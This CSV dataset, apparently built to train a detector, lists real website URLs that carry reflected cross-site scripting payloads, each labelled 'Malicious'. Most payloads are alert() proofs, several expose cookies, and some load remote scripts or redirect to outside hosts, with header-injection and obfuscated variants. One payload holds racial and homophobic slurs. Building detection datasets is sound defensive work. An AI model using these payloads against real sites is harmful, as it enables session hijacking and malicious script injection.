Payloads,Class
http://websvn.mugshot.org/listing.php?repname=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/script&gt;,Malicious
http://www.sealeathers.com/collection.cfm?attributes.collectionid=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/script&gt;,Malicious
http://www.thinker.org/deyoung/calendar/day.asp?search=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/script&gt;,Malicious
http://www.ricochet-jeunes.org/arcparucoll2.asp?coll=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/script&gt;,Malicious
http://wiki.r-project.org/rwiki/rhelp.php?id=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/script&gt;,Malicious
http://ai.yimg.jp/bdv/2757/653450/20071105/hztyv7_uet4vdnrvfoa5-c.swf?2007.10.10.8.17.32.765&amp;clickta<br>g=http://kusomiso.com,Malicious
http://www.yourfilehost.com/linkshare.php?cat=video&amp;file=nnnnn_hiroko.flv%22%3e%3cimg%20src=http://k<br>usomiso.com/jpg.jpg%3e,Malicious
http://proxy.blockquote.be/index.php?q=ahr0cdovl3d3dy54c3nlzc5jb20vij48u2nssvbupmfszxj0kc94c3mvktwvc<br>2nyaxb0pg%3d%3d&amp;hl=3ed,Malicious
http://mkt.fem.jp/encode.cgi?e=%3c/textarea%3e%3cscript%3ealert(/xss/)%3c/script%3e&amp;code=de,Malicious
http://fog.adsv.jp/30sec/30sec.php?sec=1&amp;mode=1&amp;load=1&amp;rand=562&amp;low=2&amp;size=3875&amp;alt=%22%3e%3cscript%<br>3ealert(123)%3c/script%3e,Malicious
http://www.mooseek.com/link.php?url=%0acontent-type:%20text/html%0acontent-length:16%0a%0atest......<br>......,Malicious
http://www.gaytube.com/uprofile.php?uid=&quot;&gt;&lt;script&gt;alert(/xssed again by dr.optix/)&lt;/script&gt;,Malicious
http://www.inregistrare-domenii.ro/kb/search/?s=1&amp;q=%22%3e%3cscript%3ealert%28%2fxssed+by+dr.optix%2<br>f%29%3c%2fscript%3e&amp;sb=go,Malicious
http://www.videospace.ro/uprofile.php?uid=%22%3e%3cscript%3ealert(/xssed%20by%20dr.optix/);alert(doc<br>ument.cookie)%3c/script%3e,Malicious
http://www.videospace.ro/search_result.php?search_id=%22%3e%3cscript%3ealert(%2fxssed+by+dr.optix%2f<br>)%3balert(document.cookie)%3b%3c%2fscript%3e&amp;search_typ=search_videos&amp;submit=+,Malicious
http://www.credo.ro/cautare2.php?k=%3c%2ftitle%3e%3cscript%3ealert%28%2fxssed+by+dr.optix%2f%29%3c%2<br>fscript%3e&amp;sursa=in+director,Malicious
http://plusvidz.com/index.php?search=&lt;script&gt;alert(/another xss by dr.optix/)&lt;/script&gt;,Malicious
http://tylerabell.com/?s=%22%3e%3cscript%3ealert%28document.cookie%29%3c/script%3e,Malicious
http://www.vertor.com/?mod=search&amp;words=%22%3e%3cscript%3ealert%28document.cookie%29%3b%3c%2fscript%<br>3e&amp;x=89&amp;y=11&amp;search=,Malicious
http://www.zdnet.co.kr/search/?search%5bcollection%5d=&amp;search%5bq%5d=%22%3e%3cscript%3ealert%28docum<br>ent.cookie%29%3c%2fscript%3e&amp;x=31&amp;y=7,Malicious
http://blog.trendmicro.com/?year=&lt;/title&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;,Malicious
http://www.bb.com.br/appbb/portal/ri/evt/agenda.jsp?evento.anoevento=2007&lt;body onload=alert('xss')&gt;,Malicious
http://www.iblogyou.fr/index.php?page=annuaire&amp;orderby=titre&amp;sens=&lt;script&gt;alert(/xss/)&lt;/script&gt;,Malicious
https://registration.sandbox.paypal.com/welcomepage.do?devcuserid=64wldypg2bbqy&amp;devclogin=%22%3e%3cs<br>cript%3ealert(%22i'm%20back%20-%20rstcenter.com%20-%20hackersblog.org%22)%3c/script%3e&amp;bundlecode=c3<br>&amp;country=us&amp;partner=paypal,Malicious
http://insite.blackamericaweb.com/dwb_register/errors/index.html?ecode=31&amp;emsg=%3cscript%3ealert('nu<br>llflow');%3c/script%3e,Malicious
http://www.houstontech.org/en/directories/search.asp?category=&quot;&gt;&lt;script&gt;alert(&quot;bluemax&quot;)&lt;/script&gt;,Malicious
http://www.bartsandthelondon.nhs.uk/research/search/search.asp?keywords=intellectua&amp;tv=1&quot;&gt;&lt;script&gt;al<br>ert(&quot;bluemax&quot;)&lt;/script&gt;,Malicious
http://www4.u.tv/newsroom/search.asp?type=search&amp;pt=news&quot;&gt;&lt;script&gt;alert(&quot;bluemax&quot;)&lt;/script&gt;,Malicious
http://www.toyota-canarias.es/dealers/index.asp?formid=0&amp;searchvalue=&quot;&gt;&lt;script&gt;alert(&quot;bluemax-grayha<br>tz.org&quot;)&lt;/script&gt;,Malicious
http://www.turkiyerehber.gen.tr/search.asp?go=firms&amp;opt=&quot;&gt;&lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt;,Malicious
http://www.silgilikalem.com/members.asp?mode=search&amp;m_name=g&amp;initial=1&amp;method=&quot;&gt;&lt;script&gt;alert(&quot;xssed<br>bycicosz&quot;)&lt;/script&gt;,Malicious
https://eticaret.isnet.net.tr/trtmarket/find.asp?ara=&amp;root_dept=&amp;submit.x=1&amp;submit.y=1&amp;word=&quot;&gt;&lt;scrip<br>t&gt;alert(document.cookie)&lt;/script&gt;,Malicious
http://sarki.alternatifim.com/yazdir.asp?id=7151&amp;sarki=%3ca%20href=javascript:alert(1)%3eaaa%3ca%3e,Malicious
http://www.yazilimindir.com/index.php?scm=1&amp;ara=%22%3e%3cscript%3ealert(document.cookie)%3c/script%3<br>e,Malicious
http://www.verifiedvotingfoundation.org/search.php?q=&lt;script&gt;alert(/xss/)&lt;/script&gt;,Malicious
http://demo.doubleclick.com/generators/error.asp?error=&lt;script&gt;alert(/xss/)&lt;/script&gt;,Malicious
http://newsletter.f-secure.com/public/unsubscribe.jsp?uid=&quot;&gt;&lt;body<br>onload=&quot;document.write('&lt;'%2b'script/src=//z.l.to&gt;&lt;/script&gt;');alert('xss')&quot;&gt;&lt;foo=&quot;bar,Malicious
http://www.touslesemplois.com/les_offres_cherche.php?emploi=%3cscript%3ealert%28%2fzeryus%2f%29%3c%2<br>fscript%3e%3cmarquee%3e%3ch1%3exss+by+zeryus+%3c%2fh1%3e%3c%2fmarquee%3e&amp;i1_x=ok,Malicious
http://www.100emploi.fr/offres-emplois.php?r=%3cscript%3ealert%28%2fzeryus%2f%29%3c%2fscript%3e%3cma<br>rquee%3e%3ch1%3exss+by+zeryus+%3c%2fh1%3e%3c%2fmarquee%3e&amp;l=%3cscript%3ealert%28%2fzeryus%2f%29%3c%2<br>fscript%3e%3cmarquee%3e%3ch1%3exss+by+zeryus+%3c%2fh1%3e%3c%2fmarquee%3e,Malicious
http://www.directemploi.com/liste_offres_motcle.asp?type_annonce=emp&amp;motcle=%3cscript%3ealert%28%2fz<br>eryus%2f%29%3c%2fscript%3e%3cmarquee%3e%3ch1%3exss+by+zeryus+%3c%2fh1%3e%3c%2fmarquee%3e&amp;submit2.x=6<br>&amp;submit2.y=9,Malicious
http://emploi.journaldunet.com/recherche/emploi/%3ciframe%20name=''%20src='http://xssed.com'%20scrol<br>ling='yes'%20height='220'%20width='180'%20frameborder='yes'%3e%3c/iframe%3e%3cmarquee%3e%3ch1%3exss%<br>20by%20zeryus%3c/h1%3e%3c/marquee%3e,Malicious
http://www.autorecrute.com/emploi/emploi_automobile_fullresultats.php?keys=%3cscript%3ealert%28%2fze<br>ryus%2f%29%3c%2fscript%3e%3cmarquee%3e%3ch1%3exss+by+zeryus+%3c%2fh1%3e%3c%2fmarquee%3e&amp;loca=%25&amp;con<br>t=%25&amp;submit.x=0&amp;submit.y=0&amp;submit=submit,Malicious
http://www.jobmire.com/ad_search.php?search=1&amp;search_form=right&amp;ad_sector=0&amp;ad_region=0&amp;keyword=%3cs<br>cript%3ealert%28%2fzeryus%2f%29%3c%2fscript%3e%3cmarquee%3e%3ch1%3exss+by+zeryus+%3c%2fh1%3e%3c%2fma<br>rquee%3e&amp;x=0&amp;y=0,Malicious
http://www.via-guide.com/search.php?keyword=%3cscript%3ealert(123)%3c/script%3e%3cmarquee%3e%3ch1%3e<br>zeryus%20was%20here%20!%3c/h1%3e%3c/marquee%3e,Malicious
http://sgepb.gov.cn/mail/badlogin.php?tid=0&amp;retid=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&lt;p+,Malicious
http://mail.sdaj.gov.cn:6080/badlogin.php?tid=0&amp;lid=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&lt;p+,Malicious
http://mail.zjhw.gov.cn/badlogin.php?tid=0&amp;lid=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&lt;p+,Malicious
http://mail.sczw.gov.cn:6080/badlogin.php?tid=0&amp;lid=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&lt;p+,Malicious
http://mail.dehua.gov.cn/badlogin.php?tid=0&amp;lid=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&lt;p+,Malicious
http://mail.cpol.gov.cn/badlogin.php?tid=0&amp;lid=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&lt;p+,Malicious
http://www.dygs.gov.cn:6080/badlogin.php?tid=0&amp;lid=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&lt;p+,Malicious
https://www.easypay.gr/payments/viewpaymentssearch.asp?sid=p5d917e666e1f450288db1a56986414e361ba6d5f<br>d93d47e3bca1d6873d7addd1df08ff8d171e42c&amp;lang=1,Malicious
"https://ebanking.marfinbank.gr/images/timologio.swf?clicktag=javascript:window.open(%27http://vuln.x<br>ssed.net/thirdparty/scripts/python5.html%27,%27width=650,height=380,%20top=50,%20left=50,%20director<br>ies=no,location=no,menubar=no,toolbar=no,status=no,scrollbars=yes,resizable=no%27);",Malicious
"https://wwwimages.adobe.com/www.adobe.com/images/shared/promo/182x282/182x282_countdown_badge_430.sw<br>f?clicktag=javascript:window.open(%27http://vuln.xssed.net/thirdparty/scripts/python5.html%27,%27wid<br>th=650,height=380,%20top=50,%20left=50,%20directories=no,location=no,menubar=no,toolbar=no,status=no<br>,scrollbars=yes,resizable=no%27);",Malicious
"https://www.adobe.com/images/shared/promo/182x282/182x282_countdown_badge_430.swf?clicktag=javascrip<br>t:window.open(%27http://vuln.xssed.net/thirdparty/scripts/python5.html%27,%27width=650,height=380,%2<br>0top=50,%20left=50,%20directories=no,location=no,menubar=no,toolbar=no,status=no,scrollbars=yes,resi<br>zable=no%27);",Malicious
http://www.enomcentral.com/inthenews.asp%3ch1%3exssed%20xssed%20xssed%20xssed%20xssed%20xssed%20xsse<br>d%20xssed%20xssed%20xssed%20xssed%20xssed%20%3c/h1%3e%3cscript%3ealert(%27hexspirit%27)%3c/script%3e,Malicious
http://sobar.soso.com/sobar.q?op=searchpost&amp;kw=%22%3e%3cscript%3ealert('xssed')%3c/script%3e%3cifram<br>e%20src=%22http://www.xssed.com%22%3e&amp;pid=b.idx&amp;cid=w.q.in.sb.web,Malicious
https://scm.symantec.com/ips/tw/reg_form.php?rid=report%22%3e%3ciframe%20src=http://www.xssed.com%3e,Malicious
http://www.mrecic.gov.ar/portal/repre_argentinas/plantilla.php?id=%22%3e%3cscript%3ealert%28/ar3sw0r<br>med/%29;%3c/script%3e,Malicious
http://epacplanesnormas.mma.gob.cl/ver_detalle.php?id=%22%3e%3cscript%3ealert%28/ar3sw0rmed/%29;%3c/<br>script%3e,Malicious
"http://www.marcha.com.mx/resumen.php?id=%27;alert%28string.fromcharcode%2888,83,83%29%29//\%27;alert<br>%28string.fromcharcode%2888,83,83%29%29//%22;alert%28string.fromcharcode%2888,83,83%29%29//\%22;aler<br>t%28string.fromcharcode%2888,83,83%29%29//--%3e%3c/script%3e%22%3e%27%3e%3cscript%3ealert%28string.f<br>romcharcode%2888,83,83%29%29%3c/script%3e",Malicious
http://www.wetmummy.com/video.php?search=%22%3e%3cscript%3ealert%28/ar3sw0rmed/%29;%3c/script%3e,Malicious
http://www.lawyers.com/find_a_lawyer/content_search/results.php?p=1&amp;ns=y&amp;s=%22%3e%3cbody%2fonload%3d<br>alert%28%27xss%27%29%3e&amp;x=0&amp;y=0,Malicious
http://www.zybez.net/clantoplist.php?a=&quot;&gt;&lt;body/onload=alert(/xss/)&gt;,Malicious
http://www.quotesandpoem.com/commonitems/search?searching=searchquote&amp;search=%22%3e%3cbody%2fonload%<br>3dalert%28%2fxss%2f%29%3e%27%3c%2fscript%3e%3cscript%3ealert%28%2fxss%2f%29%3c%2fscript%3e&amp;x=5&amp;y=13,Malicious
http://www.mundopt.com/search.php?keyword=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;,Malicious
http://www.thaiware.com/main/search.php?keyword=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;,Malicious
http://www.tophotels.com/search.php?keyword=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;,Malicious
http://www.ericclaptonphotos.com/search.php?keyword=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;,Malicious
http://www.rehber.gen.tr/adres/arama/%22%3e%3cscript%3ealert(document.cookie)%3c/script%3e,Malicious
http://www.sosyetiqhaber.com/search.asp?mtd=1&amp;strkey=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;,Malicious
http://www.mv.lt/lt/mineraliniai_vandenys/akcijos?item=49&amp;page=%22%3cscript%3ealert(7);%3c/script%3e,Malicious
http://www.acprail.com/?ordercreator=%22%3cscript%3ealert(document.cookie);%3c/script%3e,Malicious
http://svetainiukurimas.info/index.php?klb=%22%3cscript%3ealert(document.cookie);%3c/script%3e&amp;dir=k<br>ontaktai,Malicious
http://www.lygus.lt/itc/nvo.php?p=1&amp;pavadinimas=%22%3cscript%3ealert%287%29%3b%3c%2fscript%3e&amp;sutrum<br>pinimas=&amp;miestas=0&amp;vadove=&amp;tipas=0&amp;nariai=&amp;darbuotojai=&amp;savanoriai=&amp;kryptis=0&amp;submit=ie%f0koti,Malicious
http://foto.plius.lt/ieskoti/infoblokas?id=0&amp;cat=%22%3cscript%3ealert(7);%3c/script%3e,Malicious
http://www.finds.org.uk/treasure/results.php?searchstring=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;,Malicious
http://www.cfmemory.org/cdm4/results.php?cisoop1=any&amp;cisofield1=cisosearchall&amp;cisoroot=/cfm&amp;cisobox1<br>=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;,Malicious
http://web.jinfo.com/jobs/search/results.php?keywords=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;,Malicious
http://curezone.com/forums//search.asp?q=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;,Malicious
http://www.gebzegazetesi.com/v0.7/?s=y&amp;n=or&amp;2005=t&amp;yazar=&quot;&gt;&lt;/noscript&gt;&lt;script&gt;alert(document.cookie)<br>;&lt;/script&gt;&amp;go=1,Malicious
http://www.deu.edu.tr/deuweb/duyuru/duyuru.php?mesaj_id=210381&amp;duyuru_id=&quot;&gt;&lt;script&gt;alert(document.co<br>okie)&lt;/script&gt;,Malicious
http://img.new-bytes.net/viewer.php?id='%22%3e%3ciframe%20src=http://xssed.com%3e,Malicious
http://www.ojobuscador.com/?s=c%27%22%3e%3ch1%3etest,Malicious
http://helpdesk.bluehost.com/kb/index.php?form_submit=forgot_email&amp;mod_id=6&amp;forgot_email='&quot;&gt;&lt;h1&gt;xss,Malicious
http://www.vtr.cl/juegos/ficha.php?id_juego=96&amp;id_tipo=8+'&lt;script&gt;alert(/sqli by whk/)&lt;/script&gt;&lt;br&gt;,Malicious
http://listado.mercadolibre.com.mx/%27%3b%73%65%6c%66%2e%6c%6f%63%61%74%69%6f%6e%2e%68%72%65%66%3d%2<br>7%68%74%74%70%3a%2f%2f%77%77%77%2e%6a%63%63%68%61%72%72%79%2e%63%6f%6d%2f%70%6f%72%74%61%64%61%2f%63<br>%6f%6d%70%6f%6e%65%6e%74%2f%63%6f%6e%74%65%6e%74%2f%61%72%74%69%63%6c%65%2f%35%31%2e%68%74%6d%6c,Malicious
http://search.eset.com/esetsite/index?page=answerlink&amp;url=http://whk.webcomparte.com/&amp;answerid=16777<br>216&amp;searchid=1269279465451,Malicious
http://www.masterofmalt.co.uk/shopping/shopcustadmin.asp?msg=%3e'%3e%3cscript%20%0a%0d%3ealert(cyber<br>-unity)%3b%3c/script%3e%20%3cscript+src=%22http://cyber-unity.com/x55.js?,Malicious
http://www.caboverdeonline.com/marketplace/shopcustadmin.asp?msg=%3e'%3e%3cscript%20%0a%0d%3ealert(c<br>yber-unity)%3b%3c/script%3e%20%3cscript+src=%22http://cyber-unity.com/x55.js?,Malicious
http://www.thefinemusic.com/shopcustadmin.asp?msg=%3e'%3e%3cscript%20%0a%0d%3ealert(cyber-unity)%3b%<br>3c/script%3e%20%3cscript+src=%22http://cyber-unity.com/x55.js?,Malicious
http://www.golfdiscounter.eu/shopcustadmin.asp?msg=%3e'%3e%3cscript%20%0a%0d%3ealert(cyber-unity)%3b<br>%3c/script%3e%20%3cscript+src=%22http://cyber-unity.com/x55.js?,Malicious
http://www.libreriasanmiguel.com/shopcustadmin.asp?msg=%3e'%3e%3cscript%20%0a%0d%3ealert(cyber-unity<br>)%3b%3c/script%3e%20%3cscript+src=%22http://cyber-unity.com/x55.js?,Malicious
http://www.lowcarbgourmet.com/store/shopcustadmin.asp?msg=%3e'%3e%3cscript%20%0a%0d%3ealert(cyber-un<br>ity)%3b%3c/script%3e%20%3cscript+src=%22http://cyber-unity.com/x55.js?,Malicious
http://www.powerscripts.info/signinform.php?msg=%3cscript%3ealert(/xssed/)%3c%2fscript%3e,Malicious
http://freehotscript.com/signinform.php?msg=%3cscript%3ealert(/xssed/)%3c%2fscript%3e,Malicious
http://www.scriptin.net/signinform.php?msg=%3cscript%3ealert(/xssed/)%3c%2fscript%3e,Malicious
http://phponlyscripts.com/signinform.php?msg=%3cscript%3ealert(/xssed/)%3c%2fscript%3e,Malicious
http://www.phpsolver.com/signinform.php?msg=%3cscript%3ealert(/xssed/)%3c%2fscript%3e,Malicious
http://www.eatevansville.com/index.php?fa=%22%3e%3cscript%3ealert(/xss/)%3c/script%3e,Malicious
http://www.ethnologue.com/country_index.asp?place=%3e%22%3e%3cscript%20%3ealert(1337);%3c/script%3e,Malicious
http://www.jrspharma.de/pharma/wdeutsch/system/suche_popup.shtml?action=search&amp;configurationid=%22%3<br>e%3cscript%3ealert(1337)%3c/script%3e,Malicious
https://www.firehousenetworks.com/login/ibhp.asp?note=%22%3e%3cscript%3ealert(%22noah%20is%20a%20fag<br>got%20nigger%20bitch!%22)%3c/script%3e,Malicious
"http://www.obesityhelp.com/search/tab,search_oh/action,search_oh/?q=%22%3e%3cscript%3ealert(%22you+w<br>ant+help+with+obesity%3f+stop+eating!%22)%3c%2fscript%3e&amp;cx=000946886326336472648%3ae-vpeg4uyxw&amp;cof=<br>forid%3a9&amp;x=0&amp;y=0#859",Malicious
http://www.dsebd.org/displaycompany.php?name=%22%3e%3cscript%3ealert(1337)%3c/script%3e,Malicious
http://www.stsystems.com/index.asp?search=%22%3e%3cscript%3ealert(1337)%3c/script%3e,Malicious
http://www.itemlocator.net/scripts/cgiip.exe/wservice=ils3/webspeed/%22%3e%3cscript%3ealert%281337%2<br>9%3c/script%3e,Malicious
http://www.search.ro/search?q=%3cscript%3ealert(%2fthe_miller%2f)%3c%2fscript%3e,Malicious
http://events.i.ua/search/?words=%3c/title%3e%22%3e%3cscript%3ealert('the_miller')%3c/script%3e&amp;type<br>=text,Malicious
http://www.docstoc.com/profile/asdfasdfasf/?searchtext=%22%3e%3cscript%3ealert(%22xss%20by%20the_mil<br>ler%22)%20%3c/script%3e%3cmarquee%3exss%20by%20the_miller%3c/marquee%3e,Malicious
http://www.cgpay.co.uk/en/search/?search=&quot;&gt;&lt;script&gt;alert(&quot;fugitif&quot;)&lt;/script&gt;,Malicious
http://www.supertangas.it/vedi_profilo.php?sid=&quot;&gt;&lt;script&gt;alert(&quot;fugitif&quot;)&lt;/script&gt;,Malicious
http://www.reivisa.com/cgi_w/cfm/credit/rei/manage.cfm?ics_src=50361&quot;&gt;&lt;script&gt;alert(&quot;fugitif&quot;)&lt;/scri<br>pt&gt;,Malicious
http://www.computerworld.com/action/inform.do?command=search&amp;searchterms=f-secure+corporation}&quot;&gt;&lt;scr<br>ipt&gt;alert(&quot;test&quot;)&lt;/script&gt;,Malicious
http://www.worldpay.com/search/search.php?query=bibit&amp;start=85&amp;search=1&amp;results=10%22%27/%3e%3cscrip<br>t%3ealert%28%27xss%27%29%3c/script%3e,Malicious
"http://www.elcomsoft.com/purchase/purchase.php?product=edpr&amp;additional=&quot;&gt;&lt;script&gt;alert(string.fromch<br>arcode(88,83,83))&lt;/script&gt;",Malicious
http://www.twitbacks.com/directory.php?pn=health-beauty&amp;start=&quot;&gt;&lt;script&gt;alert('xss')&lt;/script&gt;,Malicious
http://www.wen-tech.com/news.asp?pid=3&amp;name=%3cscript%3ealert(/st@r-gaz3r/)%3c/script%3e%3cmarquee%3<br>e%3ch1%3est@r-gaz3r%3c/h1%3e%3c/marquee%3e,Malicious
http://www.c63.cn/product.asp?pid=3&amp;namep=%3cscript%3ealert(/st@r-gaz3r/)%3c/script%3e%3cmarquee%3e%<br>3ch1%3est@r-gaz3r%3c/h1%3e%3c/marquee%3e,Malicious
http://www.oasa.gr/gr/routes/other_lines.asp?altvar=%3c%3cscript%3ealert(/st@r-gaz3r/)%3c/script%3e&amp;<br>stop=%3cscript%3ealert(/st@r-gaz3r/)%3c/script%3e,Malicious
http://www.neseek.com/results.php?search=%22%3cscript%3ealert%28%2fst%40r-gaz3r%2f%29%3c%2fscript%3e<br>%3cmarquee%3e%3ch1%3est%40r-gaz3r%3c%2fh1%3e%3c%2fmarquee%3e&amp;submit=search,Malicious
http://www.skai.gr/cvresults.php?id='%3cscript%3ealert(/st@r-gaz3r/)%3c/script%3e%3cmarquee%3e%3ch1%<br>3est@r-gaz3r%3c/h1%3e%3c/marquee%3e,Malicious
http://top.pin.gr/show.php?category=%3e%3cscript%3ealert(/st@r-gaz3r/)%3c/script%3e%3ca,Malicious
"http://forums.kingsnake.com/view.php?id=1823596,1823596&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;",Malicious
http://www.smdailyjournal.com/article_preview.php?id=66988&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;,Malicious
http://www.fursr.com/details.php?id=57&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;,Malicious
http://www.findjobs.com.my/job/forgot_passwords.php?ref=&quot;&gt;&lt;script&gt;alert(/=xssbydt=/)&lt;/script&gt;,Malicious
http://www.myix.gov.my/index.php?s=&lt;script&gt;alert('=xssbydt=')&lt;/script&gt;&amp;searchbutton=go%21,Malicious
http://www.dqscert.com/servlet/contentserver/dqse/page/dqseunterrubrik/c-page/contentserver?pagename<br>=dqse/page/dqsesucheergebnis,Malicious
http://search.eol.cn/was40/search?channelid=59523&amp;searchword=&quot;&gt;&lt;script&gt;alert('=xssbydt=')&lt;/script&gt;,Malicious
http://www.asiarooms.com/search?q=&gt;&quot;&gt;&lt;script%20%0a%0d&gt;alert(/=xssbydt=/)%3b&lt;/script&gt;,Malicious
"http://mstar.com.my/cms/search.jsp?query=alert(string.fromcharcode(88,83,83))//\';alert(string.fromc<br>harcode(88,83,83))//%22;alert(string.fromcharcode(88,83,83))//\%22;alert(string.fromcharcode(88,83,8<br>3))//--%3e%3c/script%3e%22%3e'%3e%3cscript%3ealert(string.fromcharcode(88,83,83))%3c/script%3e",Malicious
